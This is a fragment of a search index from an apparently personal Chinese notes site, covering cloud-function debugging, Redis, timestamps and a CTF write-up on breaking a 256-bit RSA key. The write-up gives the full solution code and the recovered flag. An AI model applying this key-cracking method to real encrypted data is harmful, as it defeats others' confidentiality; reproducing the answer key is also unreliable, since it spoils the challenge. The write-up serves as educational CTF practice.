.</code>\u4e00\u4e2a\u4e2a\u89e3\u51b3\u4f9d\u8d56\u5305\u540e\uff0c\u5728docker\u5bb9\u5668\u4e2d\u603b\u7b97\u662f\u80fd\u591f\u8dd1\u8d77\u6765\u4e86\uff0c\u4e14\u80fd\u6b63\u5e38\u8fd4\u56de\u4e86</p> <p>\u7136\u540e\u7528<code>fcli.exe shell</code>\u7684<code>mkf</code>\u518d\u4e0a\u4f20\u4e00\u6b21\uff0c\u8c03\u7528\u51fd\u6570\u8fd8\u662f\u8001\u6837\u5b50<code>Unable to import module 'index'</code>\uff0c\u4ee4\u4eba\u5f88\u6293\u72c2\u3002\u3002\u3002</p> <p>\u7a81\u7136\u60f3\u5230\u4e0d\u80fd\u88abimport\u5e94\u8be5\u662f\u5168\u5c40\u7684import\u5931\u8d25\u4e86\uff0c\u591a\u6b21\u6298\u817e\u540e\uff0c\u628a<code>from grabber import grabber</code>\u79fb\u52a8\u5230index\u51fd\u6570\u4e2d\uff0c\u603b\u7b97\u5f97\u5230\u4e86\u660e\u786e\u7684\u62a5\u9519\uff1a\u8fd8\u662f<code>ImportError: No module named 'bs4'</code>\uff1b\u54c8\uff1f\u8fd9\u662f\u4ec0\u4e48\u9b3c\uff0c\u660e\u660e\u6211\u90fd\u628abs4\u6587\u4ef6\u5939\u653e\u5230\u4ee3\u7801\u76ee\u5f55\u4e0b\u4e86\uff0c\u4e3a\u5565\u8fd8\u662f\u62a5\u9519\uff1f</p> <p>\u65e2\u7136\u4ed6\u8bf4import\u5931\u8d25\uff0c\u4f1a\u4e0d\u4f1a\u662fPython\u641c\u7d22\u5305\u7684PATH\u7684\u95ee\u9898\uff0c\u4e8e\u662fGoogle\u5230\u4e86\u628a\u5f53\u524d\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u52a0\u5165\u641c\u7d22\u7684\u65b9\u6cd5\uff1a</p> <pre><code>sys.path.append(os.path.dirname(os.path.abspath(__file__)))\n</code></pre> <p>Orz, \u8fd8\u662f\u6ca1\u6709\u7528\u3002\u3002\u3002</p> <p>\u60f3\u5230\u65e2\u7136\u90e8\u7f72\u540e\u4ee3\u7801\u6587\u4ef6\u5939<code>/code</code>\u6ca1\u6709\u6211\u9700\u8981\u7684\u4f9d\u8d56\u5305\uff0c\u90a3<code>/code</code>\u6587\u4ef6\u5939\u91cc\u9762\u5230\u5e95\u6709\u5565\u5462\uff1f\u679c\u65adfuck\u4e00\u4e0b\uff0c\u5728index\u51fd\u6570\u5f00\u5934\u5199\u4e0a:</p> <pre><code>def index():\n    return {\"fuck\": list(os.listdir(\"/code\"))}\n    import bs4 #\u4f1a\u51fa\u9519\u7684import\n    ...#\u6b63\u5e38\u4ee3\u7801\n</code></pre> <p>\u603b\u7b97\u8c03\u7528\u6210\u529f\u4e86\uff0c\u7136\u540e\u4e00\u770b\u8f93\u51fa\u7ed3\u679c\uff0cwoc! (\u5185\u5fc3\u4e2d\u9a82\u4e86\u591a\u6b21mdzz\u963f\u91cc\u4e91</p> <p>\u7ed9\u5f20\u622a\u56fe\uff1a</p> <p></p> <p>os.listdir\u5e94\u8be5\u8fd4\u56de\u7684\u662f\u5f53\u524d\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u542b\u6709\u7684\u6587\u4ef6\u540d\u79f0\u548c\u6587\u4ef6\u5939\u540d\u79f0\uff0c\u800c\u73b0\u5728\u6211\u4eec\u770b\u5230\u7684\u662f\u542b\u6709<code>\\\\</code>\u5f88\u50cf\u8def\u5f84\u540d\u7684\u4e1c\u897f\uff0c\u8bf4\u660e\u8fd9\u4e2afcli.exe\u628awindows\u7684<code>\\\\</code>\u8def\u5f84\u540d\u5f53\u6210\u4e86\u6587\u4ef6\u540d\u7684\u4e00\u90e8\u5206\uff0c\u90e8\u7f72\u540e\u5728/code\u6587\u4ef6\u5939\u4e0b\u4e5f\u5c31\u5bf9\u5e94\u521b\u5efa\u4e86\u540d\u79f0\u4e3a<code>bs4\\\\__init__.py</code>\u8fd9\u6837\u7684\u6587\u4ef6(\u6839\u672c\u6ca1\u6709bs4\u5b50\u6587\u4ef6\u5939)\uff0cPython\u5f53\u7136\u4f1a\u627e\u4e0d\u5230bs4\u8fd9\u4e2a\u5305\u554a\uff01\u6454\uff01</p> <p>\u6539\u7528\u4eba\u5bb6fcli\u7684Linux 64bit\u7248\u672c\uff0c\u95ee\u9898\u89e3\u51b3\u3002\u3002\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0c\u4e07\u4e07\u60f3\u4e0d\u5230Windows\u7248\u672c\u7684\u5de5\u5177(\u9488\u5bf90.5\u7248\u672c)\u4f1a\u628a\u8def\u5f84\u5206\u9694\u7b26<code>\\\\</code>\u5f53\u6210\u6587\u4ef6\u540d\u4e00\u90e8\u5206\u6765\u770b\u5f85\uff0c\u771f\u662f\u5927\u5f00\u773c\u754c</p>"},{"location":"Python/#linuxgbk","title":"\u4fee\u590dLinux\u4e0bgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d","text":"<p>\u4ee3\u7801\u89c1code/fixgbknames.py</p> <p>\u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0cLinux\u4e2d\u53ef\u80fd\u4f1a\u6709gbk\u7f16\u7801\u7684\u6587\u4ef6\u540d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7528<code>ls</code>\u67e5\u770b\u90fd\u662f\u4e71\u7801\uff0c\u96be\u4ee5\u64cd\u4f5c</p> <p>\u5982\u4f55\u4fee\u590d\u8fd9\u4e9b<code>\u9519\u8bef</code>\u7684\u6587\u4ef6\u540d\u5462\uff1f\u7528\u5230<code>python3</code>\u63d0\u4f9b\u7684os.walk(b\u201d.\u201d)\u5c31\u80fd\u5f97\u5230bytes\u7c7b\u578b\u7684\u6587\u4ef6\u540d\uff0c\u7136\u540e<code>os.system</code>\u8c03\u7528bytes\u7c7b\u578b\u7684<code>mv</code>\u547d\u4ee4\u884c\u5c31\u597d\u5566~</p>"},{"location":"Python/#crack-rsa","title":"Crack RSA!","text":""},{"location":"Python/#_8","title":"\u9898\u76ee\u4fe1\u606f","text":"<p>\u9898\u76ee\u6765\u6e90\uff1a\u6e05\u534e\u84dd\u83b2\u82b1\u6218\u961f\u7eb3\u65b0\u8868\uff08\u9700\u81ea\u5907\u68af\u5b50\uff09</p> <p>\u5bc6\u7801\u5b66 (Cryptography)</p> <p>RSA\u7b97\u6cd5\u7684\u539f\u7406\u4ee5\u53ca\u7834\u89e3\uff0c\u8bf7\u4e0b\u8f7d\u8fd9\u4e2a\u6587\u4ef6\uff0c\u89e3\u5bc6\u5176\u4e2d\u7684flag.enc\u6587\u4ef6\u3002</p>"},{"location":"Python/#rsa","title":"RSA\u662f\u5565","text":"<p>\u7565\u2026(\u8fde\u8fd9\u4e2a\u90fd\u4e0d\u77e5\u9053\u8fd8\u4e0d\u53bbgoogle\uff0c\u4f60\u9002\u4e0d\u9002\u5408CTF\u5fc3\u91cc\u4e00\u70b9B\u6570\u90fd\u6ca1\u6709\u5417)</p> <p>\u7b26\u53f7\u7ea6\u5b9a\uff1a n\u4e00\u4e2a\u5927\u6570\uff0c p\u548cq\u662f\u5b83\u7684\u8d28\u56e0\u5b50\uff0cd\u79c1\u94a5\uff0cm\u4fe1\u606f\u660e\u6587\uff0cc\u4fe1\u606f\u5bc6\u6587</p>"},{"location":"Python/#_9","title":"\u7834\u89e3\u7684\u6570\u5b66\u539f\u7406","text":"<p>\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4078902/cracking-short-rsa-keys</p> <p>Google\u641c\u7d22\u5173\u952e\u8bcd crack rsa key</p> <p>\u7ed9\u5b9a\u516c\u94a5n\u548ce\uff0c\u5047\u5b9a\u6211\u4eec\u6210\u529f\u5206\u89e3n = p * q\uff0c\u90a3\u4e48\u6c42\u51fad</p> <pre><code>d = e^-1 mod phi(n)\n  = e^-1 mod (p-1)*(q-1)\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u6709\u4e86\u79c1\u94a5d\uff0c\u53ef\u4ee5\u5bf9\u5bc6\u6587c\u89e3\u5bc6\u5f97\u5230\u660e\u6587m\uff1a</p> <pre><code>m = c^d (mod n)\n</code></pre>"},{"location":"Python/#_10","title":"\u5b9e\u73b0\u5b83","text":""},{"location":"Python/#ne","title":"\u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u5565\u683c\u5f0f\uff0c\u600e\u4e48\u8bfb\u53d6\u51faN\u548ce?","text":"<p>\u9898\u76ee\u7ed9\u7684\u516c\u94a5\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>-----BEGIN PUBLIC KEY-----\nMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb\ne+fuqvuwBPUfAgMBAAE=\n-----END PUBLIC KEY-----\n</code></pre> <p>\u770b\u8d77\u6765\u5f88\u77ed\uff0c\u4f30\u8ba1\u662f\u53ef\u4ee5\u5206\u89e3\u7684\u6bd4\u8f83\u5c0f\u7684N</p> <p>google\u641c\u7d22\u5173\u952e\u8bcd\uff1aopenssl get n from public key</p> <p>\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</p> <p>\u4eba\u5bb6\u7ed9\u51fa\u4e86\u8fd9\u6837\u7684\u505a\u6cd5\uff1a(\u73af\u5883Linux\uff0c\u5df2\u7ecf\u5b89\u88c5openssl)</p> <pre><code># \u4e22\u5f03\u5934\u5c3e\u7684---\u884c\uff0c\u63d0\u53d6\u516c\u94a5\u5185\u5bb9\u5e76\u5408\u5e76\u4e00\u884c\uff08\u8fd9\u662fbase64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff09\nPUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'`\n# \u7f16\u7801\u683c\u5f0f\u662fasn1\uff0c\u67e5\u770b\u8fd9\u79cd\u7f16\u7801\u7684\u683c\u5f0f\necho $PUBKEY | base64 -d | openssl asn1parse -inform DER -i\n</code></pre> <p>\u5c06\u8f93\u51fa\uff1a</p> <pre><code>    0:d=0  hl=2 l=  60 cons: SEQUENCE\n    2:d=1  hl=2 l=  13 cons:  SEQUENCE\n    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption\n   15:d=2  hl=2 l=   0 prim:   NULL\n   17:d=1  hl=2 l=  43 prim:  BIT STRING\n</code></pre> <p>\u6700\u540e\u4e00\u884cBIT STRING\u5c31\u662f\u6570\u636e\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u504f\u79fb\u4e3a17</p> <p>\u63d0\u53d6\u51fa\u6765\uff1a</p> <pre><code>echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17\n</code></pre> <p>\u5f97\u5230\uff1a</p> <pre><code>    0:d=0  hl=2 l=  40 cons: SEQUENCE\n    2:d=1  hl=2 l=  33 prim:  INTEGER           :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F\n   37:d=1  hl=2 l=   3 prim:  INTEGER           :010001\n</code></pre> <p>\u55ef~\u8fd9\u6837\u5c31\u770b\u5230\u5341\u516d\u8fdb\u5236\u7684n\u548ce\u5566\uff0c\u8f6c\u4e3a\u5341\u8fdb\u5236\u7684\u8bddpython\u91cc\u9762\u76f4\u63a5\u8f93\u5165:</p> <pre><code>n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F\nprint(n) \n</code></pre> <p>\u4e0a\u8ff0python\u6267\u884c\u540e\u5c06\u8f93\u51fa</p> <p>90499887424928873790510606439768063703452393541528122252967476339871041516831</p> <p>\u540c\u7406\u6211\u4eec\u5f97\u77e5e=65537\uff0c\u4e00\u822cRSA\u52a0\u5bc6\u90fd\u4f1a\u628a\u516c\u94a5\u7684e\u9009\u4e3a65537</p>"},{"location":"Python/#n-pq","title":"\u600e\u4e48\u5206\u89e3n \u5f97\u5230p\u548cq\uff1f","text":"<p>\u4f60\u53ef\u4ee5\u81ea\u5df1\u5199\u4ee3\u7801\uff0c\u7136\u800c\u6211\u61d2\uff0c\u76f4\u63a5\u67e5\u6570\u636e\u5e93\uff1a</p> <p>\u6253\u5f00factordb.com\u8fd9\u4e2a\u795e\u5947\u7684\u7f51\u7ad9\uff0c\u8f93\u5165n\u7684\u503c\u5c31\u80fd\u67e5\u5230\u5206\u89e3\u7ed3\u679c\u5566\uff1a</p> <p>http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</p> <p>\u5206\u89e3\u7ed3\u679c\uff1a</p> <pre><code>9049988742...31&lt;77&gt; = 283194537446483890135816972554288437117&lt;39&gt; \u00b7 319567913424286672035093410391626922443&lt;39&gt;\n</code></pre> <p>\u597d\u4e86\uff0c\u6211\u4eec\u5c31\u77e5\u9053 p q\u4e86\uff0c\u5177\u4f53\u54ea\u4e2a\u662fp\u54ea\u4e2a\u662fq\u5e76\u4e0d\u91cd\u8981</p> <p>p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443</p>"},{"location":"Python/#d","title":"\u600e\u4e48\u8ba1\u7b97\u79c1\u94a5d","text":"<p>\u6839\u636eRSA\u539f\u7406\uff0c d = e^-1 mod (p-1)*(q-1)\uff0c \u73b0\u5728\u6211\u4eec\u6709\u4e86p\u548cq\uff0cmod\u540e\u9762\u7684(p-1)*(q-1)\u81ea\u7136\u662f\u53ef\u4ee5\u6c42\u51fa\u6765\u7684</p> <p>\u4f46e^-1\u662f\u4e2a\u5565\u73a9\u610f\uff1f\u5012\u6570\uff1f \u5012\u6570\u8fd8\u80fd\u6c42\u6a21\uff1f</p> <p>emmm \u5176\u5b9e\u662f\u6c42\u9006\u5143\u5566 \u7136\u800c\u4e0d\u4f1a\u5199\u4ee3\u7801\u600e\u4e48\u529e\uff0c\u5f53\u65f6\u662f\u7ee7\u7eedgoogle\u554a</p> <p>google\u5173\u952e\u8bcd\uff1a python calculate inverse mod</p> <p>\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</p> <p>\u5f97\u5230\u4ee3\u7801\uff1a</p> <pre><code>def egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\nelse:\n        g, y, x = egcd(b % a, a)\nreturn (g, x - (b // a) * y, y)\n\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\nif g != 1:\n        raise Exception('modular inverse does not exist')\nelse:\n        return x % m\n</code></pre> <p>\u770b\u4e0d\u61c2\u8fd9\u4ee3\u7801\u5728\u5e72\u5565\uff1f\u6211\u4e5f\u770b\u4e0d\u61c2\uff0c\u4f46\u6ca1\u5173\u7cfb\uff0c\u76f4\u63a5\u7528\u5c31\u884c \u8fd9\u4e48\u591a\u4eba\u70b9\u8d5e\u80af\u5b9a\u662f\u5bf9\u7684</p> <p>\u90a3\u73b0\u5728\u5c31\u7740\u624b\u628a\u8fd9\u4ee3\u7801\u642c\u8fd0\u5230\u6211\u4eec\u7684py\u4e2d\u54af\uff1a</p> <pre><code>N = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F\ne = 0x10001\n\np = 283194537446483890135816972554288437117\nq = 319567913424286672035093410391626922443\n\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\nelse:\n        g, y, x = egcd(b % a, a)\nreturn (g, x - (b // a) * y, y)\n\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\nif g != 1:\n        raise Exception('modular inverse does not exist')\nelse:\n        return x % m\n\nd = modinv(e, (p-1)*(q-1))\nprint(d)\n</code></pre> <p>\u4e0a\u8ff0python\u5c06\u8f93\u51fa34458919248694250828820386546500026880096887166581679876896066449320377773297\uff0c \u771f\u662f\u4e00\u4e2a\u597d\u5927\u7684d\u554a\u3002\u3002\u3002</p>"},{"location":"Python/#flagencint","title":"\u600e\u4e48\u628aflag.enc\u5f53\u6210\u4e00\u4e2aint\u8bfb\u5165\uff1f","text":"<p>\u8bd5\u56fe\u7528\u8bb0\u4e8b\u672c\u6253\u5f00flag.enc\uff0c\u4e71\u7801\u4e86\uff1b\u90a3\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u6253\u5f00flag.inc\u6587\u4ef6\u770b\u770b\uff1a </p> <p>emmm\u4e00\u517132\u5b57\u8282\u957f\u7684\u5bc6\u6587\uff0c\u76f4\u63a5\u8bfb\u6587\u4ef6\u5c06\u5f97\u5230bytes strig\uff0c\u600e\u4e48\u628a\u5b83\u8f6c\u4e3a\u4e00\u4e2a\u5f88\u5927\u7684\u6574\u6570\u5462\uff1f</p> <p>google\u5173\u952e\u8bcd\uff1a python byte string to int</p> <p>\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python</p> <p>\u4eba\u5bb6\u7ed9\u51fa\u4e86python3.2\u4ee5\u540e\u53ef\u4ee5\u7528int.from_bytes\u7684\u65b9\u5f0f\uff0c\u7ee7\u7eed\u5199\u6211\u4eec\u7684py\u54af\uff1a</p> <pre><code>encrypteddata = open('flag.enc','rb').read()\nc = int.from_bytes(encrypteddata, 'big')\nprint(c)\n</code></pre> <p>\u8fd9\u91cc\u7684\u2019big\u2019\u8868\u793a\u5927\u7aef\u5b58\u653e\u7684\u65b9\u5f0f\uff0c\u5c31\u662f\u6700\u91cd\u8981\u7684\u90a3\u4e00\u4f4d\u662f\u9760\u5de6\u8fb9\u7684</p> <p>\u63d2\u4e00\u53e5\uff1a\u901a\u8fc7\u8be2\u95ee\u5176\u4ed6\u5927\u4f6c\uff0c\u6211\u4e5f\u6298\u817e\u51fa\u4e86\u4e00\u79cdnaive\u7684\u65b9\u6cd5\u2014\u2014\u4f7f\u7528binascii\u6a21\u5757\u5148\u8f6c\u4e3ahex\u7f16\u7801\uff0c\u7136\u540ehex\u630916\u5b57\u8282\u8f6cint:</p> <pre><code>encrypteddata = open('flag.enc','rb').read()\nimport binascii\nc = int(binascii.b2a_hex(encrypteddata).decode(),16)\nprint(c)\n</code></pre>"},{"location":"Python/#_11","title":"\u8ba1\u7b97\u660e\u6587","text":"<p>\u516c\u5f0f\uff08\u5bc6\u7801\u5b66\u80af\u5b9a\u8981\u8003\u7684\uff0c\u6240\u4ee5\u518d\u8bb0\u4e00\u6b21\u54af\uff09</p> <pre><code>m = c^d (mod n)\n</code></pre> <p>\u95ee\u9898\u6765\u4e86\uff0cd\u662f\u4e2a\u90a3\u4e48\u5927\u7684\u6570\uff0c\u5982\u679c\u76f4\u63a5\u5199\u4e00\u4e2a\uff1a</p> <pre><code># \u5728python\u91cc**\u8868\u793a\u4e58\u65b9\nm = (c**d)%n\n</code></pre> <p>\u679c\u7136\u8fd0\u884c\u8fd9\u4e2apy\u5c31\u5361\u6b7b\u4e86\uff0c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5fc5\u8981\u7b97\u51fa\u7cbe\u786e\u7684c**d\uff0c\u6211\u4eec\u9700\u8981\u8c03\u7528\u5feb\u901f\u7684mod\u4e58\u65b9\u7684\u65b9\u6cd5</p> <p>google\u5173\u952e\u8bcd\uff1a python mod pow</p> <p>\u53c2\u8003\uff1ahttps://stackoverflow.com/questions/32738637/calculate-mod-using-pow-function-python</p> <p>\u4eba\u5bb6\u8bf4pow\u51fd\u6570\u5c31\u53ef\u4ee5\u63d0\u4f9b\u7b2c3\u4e2a\u53c2\u6570\uff0c\u4f8b\u5982pow(6, 8, 5)\u5c31\u662f 6^8 mod 5</p> <p>\u90a3\u5c31\u5199\u4ee3\u7801\u54af(\u778e\u5199\uff0cC\u8bed\u8a00\u7684pow\u9700\u8981#include  \u90a3\u6211\u5c31\u4e5f\u4ecemath\u5bfc\u5165\u5427)\uff1a <pre><code>from math import pow\nm = pow(c,d,n)\n</code></pre> <p>\u7136\u800c\u547d\u9014\u591a\u821b\uff0c\u679c\u7136\u62a5\u9519\uff1a</p> <pre><code>Traceback (most recent call last):\n  File \"run.py\", line 35, in &lt;module&gt;\n    m = pow(c,d,n)\nTypeError: pow expected 2 arguments, got 3\n</code></pre> <p>emmm\u2026 \u5947\u4e86\u602a\u4e86\uff0c\u8fd9\u662f\u4ec0\u4e48\u9b3c\u561b\uff0c\u8bf4\u597d\u7684\u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u5462\uff0c\u7ffb\u56de\u53bb\u4ed4\u7ec6\u770b\u4eba\u5bb6\u7ed9\u7684\u6587\u6863\u94fe\u63a5</p> <p>\u55ef\uff1f\u8fd9\u6587\u6863\u7684\u6807\u9898\u5c31\u662fBuilt-in Functions\uff0c\u6211\u61c2\u4e86\uff01 \u652f\u6301\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684pow\u51fd\u6570\u662f\u5185\u7f6e\u7684\u90a3\u4e2a\uff0c\u800c\u4e0d\u662fmath\u5e93\u63d0\u4f9b\u7684\uff0c\u5220\u6389<code>from math import pow</code>\u8fd9\u4e00\u53e5\u5c31\u597d\u4e86</p> <p>\u6211\u4eec\u7684py\u53c8\u52a0\u4e0a\u4e86\u4e24\u884c\uff1a</p> <pre><code>m = pow(c,d,n)\nprint(m)\n</code></pre> <p>\u5f97\u5230\u8f93\u51fa 4114174865819530012247735243997890458185276719507135882385278623252053258</p>"},{"location":"Python/#flag","title":"\u660e\u6587\u8fd9\u4e48\u4e00\u4e2a\u5927\u6570 \u6211\u8981\u7684flag\u5462\uff1f","text":"<p>cy\u6253\u5f00\u4e86\u4ed6\u7684\u7b14\u8bb0\u672c https://py3.io/Python.html#bytes</p> <p>\u67e5\u5230\u4e86 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32 \u548c \u62ff\u5230\u4e00\u4e2aint\u8f6c\u5b57\u7b26\u4e32 \u7684\u65b9\u6cd5\uff1a</p> <pre><code>from base64 import b16decode\nprint( b16decode( hex(m)[2:].upper() ) )\n</code></pre> <p>\u679c\u7136 \u53c8tm\u51fa\u9519\u4e86\uff1a</p> <pre><code>Traceback (most recent call last):\n  File \"run.py\", line 37, in &lt;module&gt;\nprint( b16decode( hex(m)[2:].upper() ) )\nFile \"/usr/lib/python3.5/base64.py\", line 276, in b16decode\nreturn binascii.unhexlify(s)\nbinascii.Error: Odd-length string\n</code></pre> <p>odd-length\u5565\u610f\u601d\uff1f\u5947\u6570\u957f\u5ea6\uff1f\u5bf9\u5662 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u80af\u5b9a\u8981\u5076\u6570\u957f\u5ea6\u624d\u884c\uff08\u4e24\u4e2a\u4e00\u7ec4\u8868\u793a\u4e00\u4e2a\u5b57\u8282\u561b\uff09 \u90a3\u4e48\u5c31\u524d\u9762\u8865\u4e2a0\u54af</p> <p>py\u4ee3\u7801\u5982\u4e0b\uff1a\uff08\u5176\u5b9e\u4f60\u4e5f\u53ef\u4ee5\u8bd5\u8bd5int.to_bytes\u65b9\u6cd5\uff09</p> <pre><code>plaindata = hex(m)[2:].upper()\nif len(plaindata)%2 :\n    plaindata = \"0\"+plaindata\nprint(b16decode(plaindata))\n</code></pre> <p>\u8f93\u51fa\uff1a</p> <pre><code>b'\\x02T\\x1b:(\\x02\\xb9\\x8c8\\xbb\\x00CTF{256i3_n0t_SAfe}\\n'\n</code></pre> <p>\u554a\u54c8\uff01 \u603b\u7b97\u80fd\u641e\u5b9a\u5566\uff0cflag\u5230\u624b\uff01</p>"},{"location":"Python/#_12","title":"\u5b8c\u6574\u7684\u4ee3\u7801","text":"<pre><code># parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key\n# PUBKEY=`grep -v -- ----- public.pem | tr -d '\\n'`\n# echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i\n# echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17\n\n\nn = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F\ne = 0x10001\nprint(n)\n# visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831\np = 283194537446483890135816972554288437117\nq = 319567913424286672035093410391626922443\n\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, y, x = egcd(b % a, a)\n        return (g, x - (b // a) * y, y)\n\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    else:\n        return x % m\nd = modinv(e, (p-1)*(q-1))\nprint(d)\nencrypteddata = open('flag.enc','rb').read()\nimport binascii\nc = int(binascii.b2a_hex(encrypteddata).decode(),16)\nprint(c)\nc = int.from_bytes(encrypteddata, 'big')\nprint(c)\nm = pow(c,d,n)\nprint(m)\nfrom base64 import b16decode\nplaindata = hex(m)[2:].upper()\nif len(plaindata)%2 :\n    plaindata = \"0\"+plaindata\n\nprint(b16decode(plaindata))\n</code></pre>"},{"location":"Python/#_13","title":"\u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362","text":"<p>import time</p> <p>\u5f97\u5230\u5f53\u524d\u65f6\u95f4\u6233\uff1a int(time.time())</p> <p>\u5f97\u5230\u5f53\u524d\u65f6\u95f4\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d)</p> <p>\u65f6\u95f4\u62331381419600\u8f6c\u5b57\u7b26\u4e32\uff1atime.strftime(\u201c%Y-%m-%d %H:%M:%S\u201d, time.localtime(1381419600))</p> <p>\u5b57\u7b26\u4e32\u201d2013-10-10 23:40:00\u201d\u8f6c\u65f6\u95f4\u6233\uff1aint(time.mktime(time.strptime(\u201c2013-10-10 23:40:00\u201d,\u201d%Y-%m-%d %H:%M:%S\u201d)))</p>"},{"location":"Python/#redis","title":"\u7528redis\u5b58\u50a8\u5b57\u5178","text":"<p>\u5047\u8bbe\u5b58\u50a8\u4e00\u4e2a\u7528\u6237\u540d\u5bf9\u5e94\u7528\u6237ID\u7684\u5b57\u5178\uff0c\u540d\u79f0\u4e3aUSERS\uff0c\u4f8b\u5982{\u201czhangsan\u201d:1, \u201clisi\u201d:2}</p> <pre><code>import redis\nr = redis.StrictRedis(host='localhost', port=6379, db=1) #db\u53c2\u6570\u53ef\u4ee5\u7406\u89e3\u4e3a\u547d\u540d\u7a7a\u95f4\nassert r.ping() # \u662f\u5426\u6210\u529f\u8fde\u4e0a\n\nUSERS = {\"zhangsan\":1, \"lisi\":2}\n\n# \u5b58\u50a8\u5b57\u5178\nr.hmset(\"USERS\", USERS)\n\n# \u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e\uff0c\u8fd4\u56debytes\u7684list\nKEYS = r.hkeys(\"USERS\") \n\n# \u83b7\u5f97\u6574\u4e2a\u5b57\u5178\u5e76\u8f6c\u6362\u56de\u539f\u6765\u7684\u7c7b\u578b\nUSERS1 = {i.decode():int(j) for i,j in r.hgetall(\"USERS\").items()}\n\n# \u4fee\u6539\u5b57\u5178\u4e2d\u4e00\u4e2akey\u7684value\nr.hset(\"USERS\",\"zhangsan\",3)\n\n# \u5220\u9664\u5b58\u50a8\u7684\u5b57\u5178\uff0c\u53ea\u80fd\u4e00\u4e2a\u4e2a\u5220\uff0c\u5148\u8981hkeys\u83b7\u53d6\u6709\u54ea\u4e9b\u952e\n_=[r.hdel(\"USERS\", key) for key in r.hkeys(\"USERS\") ]\n\n# \u626b\u63cf\u5f0f\u83b7\u5f97\u5df2\u7ecf\u5b58\u50a8\u7684\u5b57\u5178\u91cc\u9762\u6709\u54ea\u4e9b\u952e\n## \u5982\u679c\u5b57\u5178\u91cc\u9762\u5b58\u50a8\u4e86\u592a\u591a\u4e1c\u897f\uff0c\u6267\u884cKEYS\u4f1a\u5361\u4f4f\u6574\u4e2aredis\uff0c\u7528hscan\u662f\u66f4\u597d\u7684\u9009\u62e9\n## \u8fd9\u91cc\u5148\u751f\u6210\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u5b57\u5178\u5b58\u8fdb\u53bb\nimport random, string\nrandomstr = lambda n: \"\".join(random.sample(string.ascii_letters, n))\nUSERS = {randomstr(10): random.randint(1,10000) for _ in range(10000)} # \u751f\u6210\u4e00\u4e2a1w\u6761\u8bb0\u5f55\u7684\u5b57\u5178\nr.hmset(\"USERS\", USERS) # \u5b58\u8fdb\u53bb\n\n## \u5faa\u73afhscan\ncursor, result = r.hscan(\"USERS\")\nwhile cursor:\n    cursor, tmp = r.hscan(\"USERS\", cursor)\n    result.update(tmp)\n\nUSERS2 = {i.decode():int(j) for i,j in result.items()} #\u4ecebytes\u8f6c\u4e3a\u539f\u6765\u7684\u683c\u5f0f\nassert USERS==USERS2 #\u5b58\u8fdb\u53bb\u7684\u4e0e\u53d6\u51fa\u6765\u7684\u5e94\u8be5\u76f8\u540c\n</code></pre>"},{"location":"Python/#nexushd","title":"\u642c\u8fd0\u79cd\u5b50 \u4ece\u5317\u90ae\u4eba\u642c\u8fd0\u5230NexusHD","text":"<p>\u4ee3\u7801\uff1a code/autoseed_byr2nhd.py</p> <p>\u4f9d\u8d56\u4e8eEasyLogin\uff0c\u4ee5\u53ca <code>pip3 install transmissionrpc python-resize-image</code></p> <p>\u8fd0\u884c\u9700\u8981\u63d0\u4f9bbyr\u548cNHD\u7684\u767b\u5f55cookie\uff0c\u4ee5\u53catransmission\u8fde\u63a5\u4fe1\u606f</p>"},{"location":"Python/#python-seleniumdocker-chrome-headless","title":"python selenium+Docker chrome 